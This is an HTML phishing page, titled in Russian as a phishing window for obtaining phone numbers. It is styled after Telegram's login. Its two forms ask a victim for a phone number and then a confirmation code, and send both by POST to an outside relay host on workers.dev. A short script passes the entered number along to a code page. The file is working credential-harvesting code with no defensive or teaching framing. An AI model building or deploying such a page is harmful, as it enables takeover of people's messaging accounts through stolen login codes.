<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Фишинговое окно для получения номера телефона</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            background-color: white; /* Изменили цвет фона на белый */
        }

        .tg-icon {
            font-size: 36px;
            color: #0074b9;
            margin-bottom: 20px;
        }

        h1 {
            margin-top: 0;
        }

        form {
            display: flex;
            flex-direction: column;
            width: 100%;
            max-width: 300px;
            margin-bottom: 20px;
        }

        label {
            margin-top: 10px;
        }

        input {
            margin-bottom: 10px;
            padding: 5px;
            width: calc(100% - 10px);
        }

        button {
            margin-top: 10px;
            padding: 10px;
            width: 100%;
        }
    </style>
</head>
<body>

    <!-- Страница для ввода номера телефона -->
    <form action="https://tg-relay.egor8131723.workers.dev" method="post">
        <label for="newPhone">Новый номер телефона:</label>
        <input type="tel" id="newPhone" name="newPhone" placeholder="Новый номер телефона" required>
        <br>
        <button id="nextBtn">Далее</button>
    </form>

    <!-- Страница для ввода кода -->
    <form action="https://tg-relay.egor8131723.workers.dev" method="post">
        <label for="code">Код подтверждение:</label>
        <input type="number" id="code" name="code" placeholder="Код подтверждение" required>
        <br>
        <button id="sendBtn">Войти</button>
    </form>

    <script>
        document.getElementById('nextBtn').addEventListener('click', function() {
            const phone = document.getElementById('newPhone').value;
            const url = `/code-page?phone=${phone}`;
            document.location.href = url; // Перенаправление на страницу для ввода кода.
        });
    </script>

</body>
</html>
